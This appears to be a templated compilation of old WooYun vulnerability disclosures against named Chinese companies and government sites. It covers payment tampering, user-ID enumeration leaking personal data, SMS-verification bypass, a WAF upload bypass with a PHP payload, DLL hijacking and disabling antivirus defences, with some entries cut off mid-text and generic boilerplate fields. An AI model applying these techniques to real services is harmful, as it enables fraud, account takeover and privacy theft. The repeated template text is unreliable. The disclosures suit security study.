**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ITelephony服务对所有用户暴露了sendOemRilRequestRaw接口，所有用户可以向radio发送指令。型号：SM-N900P（NOTE3）版本：4.4.4（NH7）应该不止这个型号哦。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-013437] 某客运公司网上购票系统支付漏洞2
**厂商**: 苏州汽车客运集团 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 买张车票吧~70块这么贵便宜点吧亲 1毛如何？

**POC**: 行行 你付款吧喔

**绕过**: 直接利用

**修复**: 签名 验证
---

---
### [wooyun-2012-09436] 免费使用某互联网公司离线下载业务下载超大文件
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 非会员是无法使用某互联网公司离线下载业务的，但是登陆lixian.某域名.com后会让你试用，这个试用的规则是：试用90天，容量为3G。这个要求其实已经可以满足大部分人的临时需求了，但是如果超过3G呢？离线下载会提示我们空间不足，恰巧今天想下载一个大文件（4.1G），看了下离线下载的逻辑，发现点小问题，可以突破这个3G空间大小的限制！

**POC**: 利用方式：1，首先添加这个大文件的种子，有两个文件，其中一个相对小点，可以直接添加，我们先加这个小文件的离线，前面两个包不去考虑，因为尝试修改大小并未成功，而且这个种子的hash不知是如何计算的。主要看第三个包POST /handler/lixian/get_http_url.php HTTP/1.1Host: lixian.某域名.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0Accept: application/json, text/javasc

**绕过**: 直接利用

**修复**: 最近有个龙泽洛拉什么的，大家懂。PS：并不是什么安全BUG，某互联网公司自己瞧着办吧。
---

---
### [wooyun-2015-0154139] 搜房某站设计缺陷信息泄露和支付漏洞打包
**厂商**: sofang.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 旗下家居商城  shop.jiatx.com第一个信息泄露，登录后正常下单，修改收获地址，id值可以遍历，可以fuzz第二个支付漏洞，抓包可以数量改为负数，直接不用付钱，直接购买成功

**POC**: 如上

**绕过**: 直接利用

**修复**: 逻辑修复
---

---
### [wooyun-2015-0135548] 全时某处逻辑漏洞可生成低价订单购买商品
**厂商**: 全时 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在对商品数量检查不严密，可改成小数和负数。GET /common/checkEqNum/7/1/0.8225701334886253 HTTP/1.1  参数/1/未进行验证，可为负，可为小数

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检查购买数量
---

---
### [wooyun-2014-089313] 有利网某业务逻辑漏洞导致可无限刷红包(红包可用于投资)
**厂商**: yooli.com | **年份**: 2014 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 功能测试

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过自己的邀请链接，在有利网注册，自己就可以获得50红包，好处多多，结合有利网任意手机号码注册就可以刷钱了注册页面，手机号填写自己手机号码，提交收验证码页面填写收到的验证码，提交，拦截，手机号码修改成任意号码，我填写的是12312312111注册成功我收到的红包可无限刷，红包可以使用

**POC**: 注册页面，手机号填写自己手机号码，提交收验证码页面填写收到的验证码，提交，拦截，手机号码修改成任意号码，我填写的是12312312111注册成功我收到的红包可无限刷，红包可以使用

**绕过**: 直接利用

**修复**: 服务端做验证
---

---
### [wooyun-2015-0135762] 网站安全狗apache最新版v3.1版上传拦截bypass
**厂商**: 安全狗 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 上传功能

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在测试前，为了证明安全狗拦截上传功能，测试代码中可以不设置白名单。还有，IIS版本我没测，不知道有没有，我猜也应该有，厂商一起看看吧。由于没有对Content-Disposition大小写匹配，导致大小写绕过，可以上传任意文件。------WebKitFormBoundaryw5I4K2OgUVabXWFbcoNtent-Disposition: form-data; name="file"; filename="bypass.php"Content-Type: image/jpeg<?php phpinfo(); ?>------WebKitFormBoundaryw5I4K2OgUVabXWFb

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 好好写正则
---

---
### [wooyun-2016-0170949] 百合网支付漏洞(各种泡妞秘笈培训1元购)
**厂商**: 百合网 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 哇，是不是如图那么漂亮的妹子教呀？下单操作时可以修改价格，导致几千元的培训1元任意购买POST /index.php?g=course&m=pcindex&a=signup HTTP/1.1Host: zixun.baihe.comProxy-Connection: keep-aliveContent-Length: 83Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/53

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 判断价格，不从客户端接收。
---

---
### [wooyun-2015-0127064] 银行积分商城系统通用漏洞可泄露大量银行卡和密码（附分析过程）
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某积分商城系统存在业务逻辑漏洞，可批量枚举银行卡和交易密码，早大量用户信息泄露。部分银行如下：桂林银行积分商城  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]  https://example.com/[已脱敏]

**POC**: 用户在注册过程中确认银行卡和找回用户名时，均可对银行卡和密码进行暴力枚举。通过用户注册：https://example.com/[已脱敏] 2，确认银行卡 3，注册成功写个人信息这一步没有问题。问题出在第二步，如下图：因无桂林银行的银行卡，去网上搜索一张，得到桂林银行的银行卡如下：622856700000*****前六位应该是相同的，本次测

**绕过**: 直接利用

**修复**: 1，确认银行卡和找回用户名 密码过程中添加验证码2，对银行卡卡号和密码添加控件，拒绝明文传输。
---

---
### [wooyun-2015-095869] 豆果网一处逻辑漏洞可提前购买物品
**厂商**: 豆果网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 该商品id为401我们找个能买的商品https://example.com/[已脱敏]

**POC**: 将goods_id改为401 然后提交

**绕过**: 直接利用

**修复**: 验证时间，，
---

---
### [wooyun-2015-0147825] 轻停某停车平台跳过支付完成订单并且成功退款到账户（刷某停车平台费）
**厂商**: qtparking.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 通过某互联网公司正常下单子。（通过 Burp 修改订单价格-成功下单，不多测试）2. 正常下单子，burp 可以看到支付成功后的跳转地址https://example.com/[已脱敏]"+"/zhiFuSuccess?parkCode="+"XXXXXXXXXXXXXXX"+"&userOpenId="+"XXXXXXXXXXXX"+"&outTradeNo="+"XXXXXXXXXXXXXXX"3. 可以到订单里直接取消订单，套取回款。

**POC**: 1. 跳过支付页面，完成订单2. 退款情况，原来有30元退款，加测试后的32元变成62元。

**绕过**: 直接利用

**修复**: 你们知道的。
---

---
### [wooyun-2015-099720] 礼易商城存在支付漏洞（可泄露客户资料）
**厂商**: liyimall.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、首先，请不要忽略......然后，顺便选择一个商品下单，在提交订单时抓包，修改POST数据中的“deliver_address_id”，如图所示：提交订单后，去个人中心查看订单详情，发现收货地址变成了其他客户的，可看到其他客户的名字、详细地址及电话等，想起我们那些被贩卖的个人隐私。。。。。。2、同样是通过抓包软件抓包改包，支付金额貌似也有问题，最后是否能支付成功，没去试了，厂家自己排查一下吧。。。最后，我打客服电话取消订单的时候，客户妹子说:“是李先生吧？”我说:“是......”是个锤子哦，我是蒋先生好伐？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我不知道。。。。。你们高兴就好。
---

---
### [wooyun-2015-0123136] 某自治区官网某功能逻辑缺陷(用户密码泄露)
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.网站登陆页面https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-021337] 任意获取正方教务管理系统账号密码漏洞
**厂商**: 正方教务管理系统 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 认证接口

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以通过正方教务管理系统的C/S客户端进行任意账号的登录操作，服务器会返回其账号极其加密后的密码，通过简单的解密即可任意登陆系统，使系统处于危险之中。具体如下所述：1、可以通过旧版的C/S客户端登陆系统，初始化界面，这个时候系统已经登陆到数据库中了。然后任意输入一个账号密码，单击登陆按钮，立即采用抓包工具抓包，可以发现系统已经向服务器发送了一个查询的SQL语句2、这时候因为随意输入的密码，所以会提示您密码输入错误！3但是....令人发指的是，抓包发现已经把账号密码发到自己的客户端上来了，截图一枚，这里的密码虽然经过加密，但是加密的方式实在是想让我唾骂一把！很简单，大家自己看着办吧！4然后，然后就没有然后了，顺手登陆上去了哦！自己的某互联网公司 2595638858

**POC**: 还需要证明吗？这个算是个正方庞大的漏洞体系中的一个小巫了吧！哈哈

**绕过**: 直接利用

**修复**: 传输加密，使用复杂的密码加密手段
---

---
### [wooyun-2013-033872] 酷狗音乐dll新型劫持漏洞
**厂商**: 酷狗 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经过第三方软件测试发现酷狗音乐运行时会加载一个不存在的dwmapi.dll只要自己写一个dwmapi.dll与酷狗音乐放在同一目录，这样就可以在运行酷狗音乐的时候同时加载dwmapi.dll，dwmapi.dll可以为自制的任意恶意dll。此方法可用于启动木马。（我这里放入特定的dll后，运行酷狗音乐会启动xp系统自带的计算器，如下图）

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我懂！
---

---
### [wooyun-2013-035633] 360隐私空间程序锁形同虚设（看我突破看妹纸图片）
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.360安全卫士-隐私空间2.360安全卫士-隐私空间-程序锁3.已经成功把图库锁了4.开始绕过，先来到“应用程序管理”5.把360保险箱停止6.把360安全卫士停止7.然后我们再去打开图库时...8.尼玛，妹子妹子妹子。9.如果怕别人发现，我们打开一次360安全卫士，然后退回到桌面，神不知鬼不觉。

**POC**: 上面都是证明。

**绕过**: 过滤绕过

**修复**: 其实这是逻辑问题，360应该知道在安卓系统里面权限并不大，就不应该用这个“程序锁”来进行“隐私”的加密。使用程序锁给了用户一个错觉 让用户以为使用程序锁 自己的隐私就安全了 可以放一些隐私的东西了 这是误导用户 反倒会造成用户隐私泄露看其他加密软件都没这种加密方法（危险，我看了其他安全软件都不用这方
---

---
### [wooyun-2015-091636] 利用几处设计疏忽R3程序停安全卫士主防
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 疏忽1，360关闭主防的调用过于简单360关闭主动防御的方式是传参调用360tray，命令也比较简单，就是“360tray.exe /disablesp 2”如果用cmd调用该命令会被360拦截，但创建快捷方式（快捷方式的写法就是"路径\360tray.exe /disablesp 2"）点击调用则不会被拦，原因是360会验证调用的来源，来自explorer的调用的合法的，弹出的主防关闭询问对话框如下图所示：大家都知道，这样生成的快捷方式的图标是某安全厂商的图标，鉴于快捷方式的图标是可以修改的，可以修改.lnk文件修改之。现在，我们得到了一个能打开360主防关闭询问对话框的快捷方式，记做launch.lnk。该快捷方式用两种方式皆可运行：一种是用程序打开所在文件夹后，模拟键盘按键调用。另一种是改成邪恶的名称比如“安装”，诱使用户点击。（360策略：调用explorer打开文件夹不会被拦截，调用

**POC**: 360询问是否关掉主防的对话框上被虚假的提示文字所掩盖无论用自动鼠标按键还是人工点击，都可以关闭360主防，关闭后，360进程可随意关闭，关闭后360文件夹下的文件可随意篡改

**绕过**: 直接利用

**修复**: 1，关掉主防这样重要的功能，还是用IPC通信吧，用参数太草率2，关掉主防的询问对话框，最好复杂一些3，按来源过滤发给主防关闭询问对话框的鼠标事件4，主防关了，好歹在图标上显示一下。。。5，如有需要，与本文相关的识图定位之类的代码们，可以联系本人索取
---

---
### [wooyun-2015-0155592] 摘除某电商平台商城APK完整性检查模块(轻松盗版)
**厂商**: 某电商平台商城 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 简要步骤1、下载某电商平台手机端2、java -jar jartool d -d  jingdong.apk -o C:\out3、尝试打开Debuggle = true4、发生了完整性检查5、找关键点 字符串位置 调用位置等 注意 两个dex6、函数入口处return即可

**POC**: 成功运行。无提示。任意修改无其他限制。怎么证明呢。

**绕过**: 直接利用

**修复**: 做应用加固、代码混淆等
---

---
### [wooyun-2015-0152507] 360手机助手设计缺陷可进行部分远程操作（有限制）
**厂商**: 某安全厂商 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在手机上安装并开启360手机助手后，发现它监听了38517端口。而且此端口没有bind到本地，意味着任意能访问到它的主机都可以连接到这个端口。进一步查看发现，360手机助手在本地通过NanoHttpd实现了一个server。其serve方法如下：在里面我们看到了很多request，例如/in，/opeanApp，/openPage, 等等，显然360手机助手可以通过接收client发来的request来进行各种操作，如打开应用，访问URL等。这个方法虽然在一开始获取了一下http-client-ip，但是并没有据此进行任何判断。意味着来自任意地址的访问仍然可以被处理。对于/openPage这个request，360手机助手首先会从parameter中取得url，然后会进行如下的判断：看起来360手机助手对URL的来源进行了限制，仅允许访问几个自己的域名。但是不幸的是，这个限制实际上可以轻易

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2015-0144601] 某证券软件爱基金客户端之账户密码找回功能的短信验证可被绕过
**厂商**: 某证券软件 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.客户端基本信息此次测试采用的是Android客户端，下载地址：http://**.**.**.**/public/mobile/apk  : com.hexin.android.bank, 48, V4.30.03, 某证券软件爱基金apkmd5: ea96923d1ab76255b1f4e6a076482d4a证书 :certmd5: 110582f43caed505854599c7ada28e77issuer: C=CN, ST=ZheJiang, L=Hangzhou, O=ShouJiKaiFaZu, OU=TongHuaShun, CN=hexinsubject: C=CN, ST=ZheJiang, L=Hangzhou, O=ShouJiKaiFaZu, OU=TongHuaShun, CN=hexin2.漏洞描述找回密码功能，服务端通过客户端输入动态短信验证码来鉴别身份，但

**POC**: 1.输入姓名和身份证号：2.输入银行卡号：3.填写动态短信验证码：4.在短信验证码输入栏中随意输入数字，并提交5.此时服务端返回验证码失败状态信息，code=89976.通过burp拦截服务端返回验证码验证信息，将其修改为：{"message":"短信验证成功","url":null,"code":"0000","custId":null,"singleData":null,"listData":null}7.此时客户端进入密码修改界面：8.输入密码并提交后，服务端返回的状态信息显示，修改成功：9.然而，从客户端提交修改密码的请求报文分析得知，只需要知道custId（每个注册账户都会分配唯一的

**绕过**: 直接利用

**修复**: 提交密码修改操作的请求中可带上短信验证码，服务端再对其进行验证，判断是否进行密码修改操作。
---

---
### [wooyun-2012-011862] 迅雷账号暴力猜解漏洞
**厂商**: 迅雷 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1,迅雷绝大部分登陆地址均采用统一接口,有次数和验证码限制;2,迅雷旗下各个论坛采用默认接口,部分论坛的登陆模块没有次数和验证码限制;3,迅雷旗下各论坛可以采用迅雷账号登陆.

**POC**: 1,采用固定弱口令,批量猜解用户UID;2,成功率很高,跑了十万个后,大概收获到1000个账号;3,剔除某些论坛UID的结果(本意是使用迅雷ID,但该接口可以使用论坛UID登陆.即HAVIJ经常说的"FAKE result").

**绕过**: 直接利用

**修复**: 论坛登陆依然增加登陆限制.
---

---
### [wooyun-2015-0103233] iOS URL Scheme劫持-在未越狱的iPhone 6(iOS 8.2)上盗取某电商平台和某互联网公司支付的帐号密码
**厂商**: 苹果 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 事先声明：1、该漏洞是iOS系统漏洞，和某电商平台，某互联网公司app无关。本文只是拿某电商平台和某互联网公司作为演示漏洞的应用，其他应用同样可以中招，转发者请勿断章取义。2、此漏洞是另一个漏洞，和“在非越狱的iPhone 6 (iOS 8.1.3) 上进行钓鱼攻击 (盗取App Store密码)”上利用的漏洞无关，本人不会干用一个漏洞写两个文章灌水的事情。该漏洞最早是由我在FireEye的同事hui, Song jin和lenx发现的，因为该漏洞利用简单，修复却非常复杂，所以在iOS 8.2上还是未能修复。虽然iOS尚未修复，但app本身还是可以有防护的方法，本人在文章最后会提出一些应急的解决方案以供开发人员参考。

**POC**: 首先来看demo:在未越狱的iPhone6(iOS 8.2)上盗取某电商平台帐号密码Youtube（需翻墙）: https://example.com/[已脱敏] https://example.com/[已脱敏] 8.2)上盗取某互联网公司支付密码Youtube（需翻墙）: https://example.com/[已脱敏] https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 解决方案：1、针对iOS系统。因为Bundle ID在App Store上是唯一的（类似Android上的package name）苹果可以限制iOS应用不能注册别的应用的Bundle ID作为URL Scheme。这样的话，使用自己的Bundle ID作为URL Scheme的接收器就会变的安全很
---

---
### [wooyun-2012-012970] 易宝支付手机充值平台可能存在支付漏洞
**厂商**: 易宝支付 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 在这个页面充值的时候可以截断数据并修改。因为没有网银，所以没继续搞。

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 数据提交时验证
---

---
### [wooyun-2013-035522] 乌云一处有意思的逻辑漏洞可能钓鱼别人的短消息
**厂商**: 乌云官方 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发短消息的地方有这么一句：输入WooYun上的用户昵称/厂商名称所以。。。。我们注册一个和厂商名字一样的帐号，是不是就能劫持厂商的短消息了呢？于是，发了个小洞，注册了个帐号https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不允许注册和厂商一样的帐号呀
---

---
### [wooyun-2013-023261] 手机游戏保卫萝卜游戏设计缺陷导致瞬间孵化怪物蛋
**厂商**:  | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正常情况，孵化怪物但需要等待一定的时间，几分钟到几个小时不等，但是判断规则是依赖于手机系统时间，通过修改手机系统时间到一个超前的时间，即可实现瞬间孵化怪物蛋。对于游戏厂商来说，打破了游戏原有的规则，其提供的道具就没有用了，直接影响收入呀。。。

**POC**: 打出个宠物蛋，比如需要24小时孵化出，那么将当前手机系统时间调快24小时，然后重新进入游戏，即可。测试平台IOS

**绕过**: 直接利用

**修复**: 通过其他方式判断。。。
---

---
### [wooyun-2012-014706] 某电商平台会员中心某验证功能权限设计错误
**厂商**: 江苏某电商平台电子商务有限公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.某电商平台会员中心，有一个手机验证功能。该功能为了方便会员绑定手机。2.手机绑定，需要先通过邮箱认证，该过程需要输入验证码进行。3.通过邮箱验证获取验证码后，可以进行手机验证，但是不限定手机号码，也不需要验证码，仅仅输入手机号，即可获取验证码，而且所谓的60秒等待再发功能是通过网页JS控制的，实际上无时间限制。4.通过抓包后再次提交进行权限验证，该手机验证码发布接口，未做任何验证，没有对提交来源，提交次数，提交号码等做出验证，通过该接口可以无限制的提交手机验证请求。通过简单的编程可以瞬间对某号码发出上千条验证码，可以简单的来制作一个“手机短信轰炸机”。

**POC**: 1.在后台按照常规的验证手机号的步骤进行验证，通过邮箱验证后，可以进行手机号验证，对手机号验证过程进行抓包。2.验证完毕后，手机接到验证码，转到抓包工具中，可以看到网页端提交了2个请求。我提交了2次获取验证码，得到4条请求信息，经查看，第一条是验证号码信息是否合法的，没有意义，第二条请求是发送手机验证码的。通过POST(实际上是GET也可以)协议，提交一个请求：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1.加入权限验证，非用户禁止提交。2.加入时间验证，如60s一次。3.加入号码验证。某号码一段时间内只允许发N条。
---

---
### [wooyun-2015-0165574] 某市人民政府邮箱系统设计逻辑缺陷内部信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/很多都存在弱口令因为登录是强制修改密码zhaoxueqin 的密码我改为q1w2e3r4

**POC**: http://**.**.**.**/很多都存在弱口令因为登录是强制修改密码zhaoxueqin 的密码我改为q1w2e3r4

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0144844] 糖果网逻辑漏洞（泄露所有用户家庭地址等信息、冒充用户，盗取所有用户余额）
**厂商**: 糖果网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.tangguow.cn漏洞1：泄露所有用户家庭地址等信息：进入购物车：在第一步,单击结算进入第二步时抓包：更改userid,爆出其他用户的信息:Ok 那么拿burp跑一下：地址全出来了。随便一跑的结果：空地址的数据包长度为14484，上述数据包均包含用户信息漏洞2：冒充用户，盗取所有用户余额如果在这一系列二购买过程中替换userid，将在最后一页看到这个：Ok 用户没有余额，那么要是有余额呢？进入财务中心：进行交易记录查询并且抓包然后同样替换userid,并且跑包：长度为11743的是没钱的，那么这些用户呢：11746代表1000元Ok那么现在得到有余额用户的id了，那就让他们替我们付款吧：在提交订单出抓包：用户改为117这时会重定GET请求：两个包的id必须一样好了地址信息是我的，然而钱别人付：提示没有支付密码，还是同样的思路之后所有的包都使用userid=117设置好密码之后纠

**POC**: 同上

**绕过**: 直接利用

**修复**: 能给个20rank吗 影响确实很严重
---

---
### [wooyun-2014-074623] 天翼云盘通支付逻辑漏洞(可产生负值)
**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: --------------------------------

**绕过**: 直接利用

**修复**: 在服务端计算金额的时候，一定要判断是否为正数。
---

---
### [wooyun-2012-013160] 主动防御类软件的通用实现漏洞
**厂商**: 客户端安全公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 参数注入

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 主防会拦截系统的一些关键操作，在这些监控点上做参数检查。因为参数往往来自用户态，所以参数检查的过程是在一个__try里面，防止访问违规造成crash。一般的模式类似如下：bool bPass = true;__try{bPass = check_paramters(p1,p2,p3);  // p为参数}__except(1){bPass = true;}return (bPass ? status_success : status_access_denied);上面只是伪代码，意思是对参数进行检查，如果发现有恶意行为，那么返回拒绝，不允许执行。（实际远比这复杂，对参数会经过很多策略检查。结果也不是直接返回，有可能弹框由用户决策）。问题在于，如果访问参数的时候出现异常，那么后续的处理只好放过这个行为。问题就在这里，如果可以让主防访问参数出现异常，但是系统实际使用参数的时候却可以正常，那么主

**POC**: pStr = (PUNICODE_STRING)VirtualAlloc(NULL,PAGE_SIZE,MEM_COMMIT,PAGE_READWRITE);if(!pStr){_tprintf(_T("Alloc Str Failed\n"));goto __Cleanup;}pStr->Length = (USHORT)(wcslen(SERVICE_PATH) * sizeof(WCHAR));pStr->MaximumLength = pStr->Length + sizeof(WCHAR);pStr->Buffer = (PWSTR)(pStr + 1);wcscpy_s(pStr-

**绕过**: 过滤绕过

**修复**: 自己研究...感谢 newtongao 和 garymao
---

---
### [wooyun-2012-011957] 某互联网公司找回密码短信无限发
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

